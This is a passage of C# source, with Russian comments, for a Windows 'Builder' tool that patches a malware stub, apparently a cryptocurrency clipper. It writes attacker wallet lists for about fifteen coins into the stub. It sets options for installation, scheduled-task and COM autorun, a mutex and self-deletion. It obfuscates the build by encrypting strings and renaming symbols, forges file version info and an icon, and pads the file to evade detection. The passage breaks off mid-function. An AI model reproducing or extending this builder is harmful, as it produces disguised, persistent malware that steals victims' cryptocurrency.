using Builder.Plugins;
using Builder.RenamingObfuscation;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Server.RenamingObfuscation.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;
using Toolbelt.Drawing;
using Vestris.ResourceLib;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using Application = System.Windows.Forms.Application;

namespace Builder
{
    public partial class Form1 : MetroForm
    {
        public static string buildicon = "";
        public static string pathProf = "";
        public static string keystring = "";
        public static string btc = "";
        public static string bc1 = "";
        public static string eth = "";
        public static string xmr = "";
        public static string xlm = "";
        public static string xrp = "";
        public static string ltc = "";
        public static string nec = "";
        public static string bch = "";
        public static string dash = "";
        public static string doge = "";
        public static string trx = "";
        public static string zcash = "";
        public static string bnb = "";
        public static string ton = "";
        public Form1(string fileName)
        {
            InitializeComponent();
        }

        // Создаем Build.exe
        private void metroButton_BUILD_Click(object sender, EventArgs e)
        {

            metroButton_BUILD.Enabled = false;
            // Сохраняем настройки
            if (metroCheckBox1.Checked)
            {
                SaveSettings();

            }
            keystring = txt_key.Text;
            // Проверяем наличие стаба
            string stubexe = Path.Combine(Application.StartupPath, "Stub", "Stub.exe");
            if (!File.Exists(stubexe))
            {
                MessageBox.Show("Stub Not Found \n\t" + stubexe, "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {

                ModuleDefMD asmDef;
                using (asmDef = ModuleDefMD.Load(stubexe))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = true;
                    saveFileDialog1.FileName = "Build";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        metroButton_BUILD.Text = "Write Settings...";
                        Thread.Sleep(500);
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        WriteSettings_PR(asmDef, saveFileDialog1.FileName);

                        metroButton_BUILD.Text = "Encrypt String...";
                        Thread.Sleep(500);
                        EncryptString.DoEncrypt(asmDef);

                        metroButton_BUILD.Text = "Renaming...";
                        Thread.Sleep(500);
                        Renaming.DoRenaming(asmDef);


                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();

                        if (metroToggle_assembly.Checked)
                        {
                            metroButton_BUILD.Text = "Write Assembly Info...";
                            Thread.Sleep(500);
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (metroToggle_icon_Build.Checked)
                        {
                            metroButton_BUILD.Text = "Set icon...";
                            Thread.Sleep(500);

                            if (File.Exists(buildicon))
                            {
                                IconInjector.InjectIcon(saveFileDialog1.FileName, buildicon);
                            }
                            else
                            {
                                MessageBox.Show("File icon Not Found \n\t" + buildicon, "File icon Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                        if (metroToggle_Add_Bytes_Build.Checked)
                        {
                            metroButton_BUILD.Text = "Add Bytes To Build...";
                            Thread.Sleep(500);
                            AddBytes.Add(saveFileDialog1.FileName, Convert.ToInt32(addBytesbuildnum.Value.ToString()) * 1024);
                        }

                        Form1 formBuilt = new Form1(saveFileDialog1.FileName);
                        MessageBox.Show("OK: " + saveFileDialog1.FileName, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        if (metroCheckBox1.Checked) 
                            Process.Start("explorer.exe", pathProf);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                metroButton_BUILD.Text = "Build";
                metroButton_BUILD.Enabled = true;
            }
        }

        // Записываем инфо о файле
        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txt_File_Version.Text;
                versionResource.ProductVersion = txt_Version.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txt_Product.Text;
                stringFileInfo["FileDescription"] = txt_Description.Text;
                stringFileInfo["CompanyName"] = txt_Company.Text;
                stringFileInfo["LegalCopyright"] = txt_Copyright.Text;
                stringFileInfo["LegalTrademarks"] = txt_Trademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txt_Original_Name.Text;
                stringFileInfo["OriginalFilename"] = txt_Original_Name.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void WriteSettings_PR(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "HELP_String")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC]")
                                        method.Body.Instructions[i].Operand = Helpers.btc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = Helpers.bc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = Helpers.eth;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR]")
                                        method.Body.Instructions[i].Operand = Helpers.xmr;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = Helpers.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = Helpers.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC]")
                                        method.Body.Instructions[i].Operand = Helpers.ltc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = Helpers.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = Helpers.bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = Helpers.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = Helpers.doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = Helpers.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = Helpers.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = Helpers.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = Helpers.ton;

                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        // Записываем настройки в STUB
        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Config")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (metroToggle_Install.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }


                                    if (metroToggle_AutoRun_Scheduler.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }


                                    if (metroToggle_Run_COM.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_Delete_Source_File.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }


                                    if (method.Body.Instructions[i].Operand.ToString() == "[SYSDIR]")
                                        method.Body.Instructions[i].Operand = metroComboBox1.SelectedIndex.ToString();
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DIR]")
                                        method.Body.Instructions[i].Operand = txt_build_dir.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BIN]")
                                        method.Body.Instructions[i].Operand = txt_build_name.Text;



                                    if (method.Body.Instructions[i].Operand.ToString() == "[TASKNAME]")
                                        method.Body.Instructions[i].Operand = txt_taskName.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[MUTEX]")
                                        method.Body.Instructions[i].Operand = txt_mutex.Text;


                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC]")
                                        method.Body.Instructions[i].Operand = btc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = bc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = eth;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR]")
                                        method.Body.Instructions[i].Operand = xmr;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC]")
                                        method.Body.Instructions[i].Operand = ltc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = ton;


                                    if (metroToggle_Add_Bytes_Infection.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDDBYTES]")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDKB]")
                                            method.Body.Instructions[i].Operand = addBytesInfectionNum.Value.ToString();
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDDBYTES]")
                                            method.Body.Instructions[i].Operand = "false";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDKB]")
                                            method.Body.Instructions[i].Operand = "0";
                                    }
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        public void SaveSettings()
        {
            try
            {
                string rnd = $"Profile_{Helpers.Random(16)}".Trim();
                if (!File.Exists(Path.Combine(Application.StartupPath, metroLabel17.Text, metroLabel17.Text + ".profile")))
                {
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, rnd));
                    metroLabel17.Text = rnd;
                }
                else
                    rnd = metroLabel17.Text;

                metroLabel17.ForeColor = Color.DarkGreen;
                string pathProfile = Path.Combine(Application.StartupPath, rnd);
                IniFile manager = new IniFile(Path.Combine(pathProfile, rnd + ".profile"));
                manager.Write("SysPath", metroComboBox1.SelectedIndex.ToString(), "Install");
                manager.Write("BuildPath", txt_build_dir.Text, "Install");
                manager.Write("BuildName", txt_build_name.Text, "Install");
                manager.Write("TaskName", txt_taskName.Text, "Install");
                manager.Write("Mutex", txt_mutex.Text, "Install");
                manager.Write("KeyString", txt_key.Text, "Install");

                if (metroToggle_assembly.Checked)
                    manager.Write("Used", "true", "Assembly");
                else
                    manager.Write("Used", "false", "Assembly");

                manager.Write("Product", txt_Product.Text, "Assembly");
                manager.Write("Description", txt_Description.Text, "Assembly");
                manager.Write("Company", txt_Company.Text, "Assembly");
                manager.Write("Copyright", txt_Copyright.Text, "Assembly");
                manager.Write("Trademarks", txt_Trademarks.Text, "Assembly");
                manager.Write("Original_Name", txt_Original_Name.Text, "Assembly");
                manager.Write("Version", txt_Version.Text, "Assembly");
                manager.Write("File_Version", txt_File_Version.Text, "Assembly");

                if (metroToggle_icon_Build.Checked)
                    manager.Write("Used", "true", "IconBuild");
                else
                    manager.Write("Used", "false", "IconBuild");

                // Options
                if (metroToggle_Install.Checked)
                    manager.Write("Install", "true", "Options");
                else
                    manager.Write("Install", "false", "Options");

                if (metroToggle_Run_COM.Checked)
                    manager.Write("AutoRunCOM", "true", "Options");
                else
                    manager.Write("AutoRunCOM", "false", "Options");

                if (metroToggle_AutoRun_Scheduler.Checked)
                    manager.Write("AutoRun_Scheduler", "true", "Options");
                else
                    manager.Write("AutoRun_Scheduler", "false", "Options");

                if (metroToggle_Delete_Source_File.Checked)
                    manager.Write("Delete_Source_File", "true", "Options");
                else
                    manager.Write("Delete_Source_File", "false", "Options");

                if (metroToggle_Add_Bytes_Build.Checked)
                {
                    manager.Write("Add_Bytes_Build", "true", "Options");
                    manager.Write("Add_Bytes_Build_KB", addBytesbuildnum.Value.ToString(), "Options");
                }
                else
                {
                    manager.Write("Add_Bytes_Build", "false", "Options");
                    manager.Write("Add_Bytes_Build_KB", "0", "Options");
                }

                if (metroToggle_Add_Bytes_Infection.Checked)
                {
                    manager.Write("Add_Bytes_Infection", "true", "Options");
                    manager.Write("Add_Bytes_Infection_KB", addBytesInfectionNum.Value.ToString(), "Options");
                }
                else
                {
                    manager.Write("Add_Bytes_Infection", "false", "Options");
                    manager.Write("Add_Bytes_Infection_KB", "0", "Options");
                }
                if (btc != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "btc.txt"), btc.Trim().Split(','));

                if (bc1 != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "bc1.txt"), bc1.Trim().Split(','));

                if (eth != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "eth.txt"), eth.Trim().Split(','));

                if (xmr != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "xmr.txt"), xmr.Trim().Split(','));

                if (xlm != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "xlm.txt"), xlm.Trim().Split(','));

                if (xrp != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "xrp.txt"), xrp.Trim().Split(','));

                if (ltc != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "ltc.txt"), ltc.Trim().Split(','));

                if (nec != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "nec.txt"), nec.Trim().Split(','));

                if (bch != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "bch.txt"), bch.Trim().Split(','));

                if (dash != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "dash.txt"), dash.Trim().Split(','));

                if (doge != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "doge.txt"), doge.Trim().Split(','));

                if (trx != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "trx.txt"), trx.Trim().Split(','));

                if (zcash != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "zcash.txt"), zcash.Trim().Split(','));

                if (bnb != "")
                    File.WriteAllLines(Path.Combine(pathProfile, "bnb.txt"), bnb.Trim().Split(','));

                pathProf = pathProfile;
            }
            catch { }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        public static string LoadTxt(string lts)
        {
            string wallets = "";
            string[] lines = File.ReadAllLines(lts);
            foreach (string s in lines)
            {
                if(s != "")
                wallets += s.Trim() + ",".Trim();
            }
            return wallets;
        }


        // Загрузка профиля
        private async void metroButton20_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select Settings.profile file with addresses 1 per line...";
                ofd.Filter = "Settings.profile (*.profile)|*.profile";
                ofd.Multiselect = false;
                ofd.InitialDirectory = Application.StartupPath;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                    try
                    {
                        // обработка текста
                        IniFile manager = new IniFile(ofd.FileName);
                        metroLabel17.Text = Path.GetFileNameWithoutExtension(ofd.FileName);
                        metroComboBox1.SelectedIndex = manager.ReadInt("SysPath", "Install");
                        txt_build_dir.Text = manager.ReadString("BuildPath", "Install");
                        txt_build_name.Text = manager.ReadString("BuildName", "Install");
                        txt_taskName.Text = manager.ReadString("TaskName", "Install");
                        txt_mutex.Text = manager.ReadString("Mutex", "Install");
                        txt_key.Text = manager.ReadString("KeyString", "Install");

                        if (manager.ReadBool("Used", "Assembly"))
                            metroToggle_assembly.Checked = true;
                        else
                            metroToggle_assembly.Checked = false;

                        txt_Product.Text = manager.ReadString("Product", "Assembly");
                        txt_Description.Text = manager.ReadString("Description", "Assembly");
                        txt_Company.Text = manager.ReadString("Company", "Assembly");
                        txt_Copyright.Text = manager.ReadString("Copyright", "Assembly");
                        txt_Trademarks.Text = manager.ReadString("Trademarks", "Assembly");
                        txt_Original_Name.Text = manager.ReadString("Original_Name", "Assembly");
                        txt_Version.Text = manager.ReadString("Version", "Assembly");
                        txt_File_Version.Text = manager.ReadString("File_Version", "Assembly");

                        if (manager.ReadBool("Used", "IconBuild"))
                            metroToggle_icon_Build.Checked = true;
                        else
                            metroToggle_icon_Build.Checked = false;

                        if (manager.ReadBool("Install", "Options"))
                            metroToggle_Install.Checked = true;
                        else
                            metroToggle_Install.Checked = false;

                        if (manager.ReadBool("AutoRunCOM", "Options"))
                            metroToggle_Run_COM.Checked = true;
                        else
                            metroToggle_Run_COM.Checked = false;

                        if (manager.ReadBool("AutoRun_Scheduler", "Options"))
                            metroToggle_AutoRun_Scheduler.Checked = true;
                        else
                            metroToggle_AutoRun_Scheduler.Checked = false;

                        if (manager.ReadBool("Delete_Source_File", "Options"))
                            metroToggle_Delete_Source_File.Checked = true;
                        else
                            metroToggle_Delete_Source_File.Checked = false;
                        if (manager.ReadBool("Add_Bytes_Build", "Options"))
                        {
                            metroToggle_Delete_Source_File.Checked = true;
                            addBytesbuildnum.Value = manager.ReadInt("Add_Bytes_Build_KB", "Options");
                        }
                        else
                        {
                            metroToggle_Delete_Source_File.Checked = false;
                            addBytesbuildnum.Value = 0;
                        }


                        if (manager.ReadBool("Add_Bytes_Infection", "Options"))
                        {
                            metroToggle_Add_Bytes_Infection.Checked = true;
                            addBytesInfectionNum.Value = manager.ReadInt("Add_Bytes_Infection_KB", "Options");
                        }
                        else
                        {
                            metroToggle_Add_Bytes_Infection.Checked = false;
                            addBytesInfectionNum.Value = 0;
                        }

                            string btc_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "btc.txt");
                            if (File.Exists(btc_p))
                            {
                                btc = LoadTxt(btc_p);
                                toolStripLabel_btc.Text = (btc.Trim().Split(',').Length - 1).ToString();
                            }


                            string bc1_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "bc1.txt");
                            if (File.Exists(bc1_p))
                            {
                                bc1 = LoadTxt(bc1_p);
                                toolStripLabel_bc1.Text = (bc1.Trim().Split(',').Length - 1).ToString();
                            }

                            string eth_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "eth.txt");
                            if (File.Exists(eth_p))
                            {
                                eth = LoadTxt(eth_p);
                                toolStripLabel_eth.Text = (eth.Trim().Split(',').Length - 1).ToString();
                            }

                            string xmr_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "xmr.txt");
                            if (File.Exists(xmr_p))
                            {
                                xmr = LoadTxt(xmr_p);
                                toolStripLabel_xmr.Text = (xmr.Trim().Split(',').Length - 1).ToString();
                            }

                            string xlm_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "xlm.txt");
                            if (File.Exists(xlm_p))
                            {
                                xlm = LoadTxt(xlm_p);
                                toolStripLabel_xlm.Text = (xlm.Trim().Split(',').Length - 1).ToString();
                            }

                            string xrp_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "xrp.txt");
                            if (File.Exists(xrp_p))
                            {
                                xrp = LoadTxt(xrp_p);
                                toolStripLabel_xrp.Text = (xrp.Trim().Split(',').Length - 1).ToString();
                            }

                            string ltc_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "ltc.txt");
                            if (File.Exists(ltc_p))
                            {
                                ltc = LoadTxt(ltc_p);
                                toolStripLabel_ltc.Text = (ltc.Trim().Split(',').Length - 1).ToString();
                            }

                            string nec_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "nec.txt");
                            if (File.Exists(nec_p))
                            {
                                nec = LoadTxt(nec_p);
                                toolStripLabel_nec.Text = (nec.Trim().Split(',').Length - 1).ToString();
                            }

                            string bch_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "bch.txt");
                            if (File.Exists(bch_p))
                            {
                                bch = LoadTxt(bch_p);
                                toolStripLabel_bch.Text = (bch.Trim().Split(',').Length - 1).ToString();
                            }

                            string dash_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "dash.txt");
                            if (File.Exists(dash_p))
                            {
                                dash = LoadTxt(dash_p);
                                toolStripLabel_dash.Text = (dash.Trim().Split(',').Length - 1).ToString();
                            }

                            string doge_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "doge.txt");
                            if (File.Exists(doge_p))
                            {
                                doge = LoadTxt(doge_p);
                                toolStripLabel_doge.Text = (doge.Trim().Split(',').Length - 1).ToString();
                            }

                            string trx_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "trx.txt");
                            if (File.Exists(trx_p))
                            {
                                trx = LoadTxt(trx_p);
                                toolStripLabel_trx.Text = (trx.Trim().Split(',').Length - 1).ToString();
                            }

                            string zcash_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "zcash.txt");
                            if (File.Exists(zcash_p))
                            {
                                zcash = LoadTxt(zcash_p);
                                toolStripLabel_zec.Text = (zcash.Trim().Split(',').Length - 1).ToString();
                            }

                            string bnb_p = Path.Combine(Path.GetDirectoryName(ofd.FileName), "bnb.txt");
                            if (File.Exists(bnb_p))
                            {
                                bnb = LoadTxt(bnb_p);
                                toolStripLabel_ton.Text = (bnb.Trim().Split(',').Length - 1).ToString();
                            }

                            metroButton1.Enabled = true;

                            metroLabel17.ForeColor = Color.DarkGreen;

                            // metroButton1.Enabled = false;
                            // FileStream reader = new FileStream(ofd.FileName, FileMode.Open);
                            //  IniFile manager = new IniFile(ofd.FileName);



                        }
                        catch (Exception ex) { MessageBox.Show(ex.ToString()); metroButton1.Enabled = true; };

                    });
                }
            }
            Assembly_Checked();
            Icon_Checked();
        }
        private async void metroButton1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton1.Enabled = false;
                                btc = LoadTxt(ofd.FileName);
                                toolStripLabel_btc.Text = (btc.Trim().Split(',').Length - 1).ToString();
                                metroButton1.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });
                }
            }
        }
        private async void metroButton18_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton1.Enabled = false;
                                bc1 = LoadTxt(ofd.FileName);
                                toolStripLabel_bc1.Text = (bc1.Trim().Split(',').Length - 1).ToString();
                                metroButton1.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }
        private async void metroButton2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton2.Enabled = false;
                                eth = LoadTxt(ofd.FileName);
                                toolStripLabel_eth.Text = (eth.Trim().Split(',').Length - 1).ToString();
                                metroButton2.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }
        private async void metroButton4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton4.Enabled = false;
                                trx = LoadTxt(ofd.FileName);
                                toolStripLabel_trx.Text = (trx.Trim().Split(',').Length - 1).ToString();
                                metroButton4.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton3.Enabled = false;
                                bch = LoadTxt(ofd.FileName);
                                toolStripLabel_bch.Text = (bch.Trim().Split(',').Length - 1).ToString();
                                metroButton3.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton8_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton8.Enabled = false;
                                doge = LoadTxt(ofd.FileName);
                                toolStripLabel_doge.Text = (doge.Trim().Split(',').Length - 1).ToString();
                                metroButton8.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton7_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton7.Enabled = false;
                                ltc = LoadTxt(ofd.FileName);
                                toolStripLabel_ltc.Text = (ltc.Trim().Split(',').Length - 1).ToString();
                                metroButton7.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton6_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
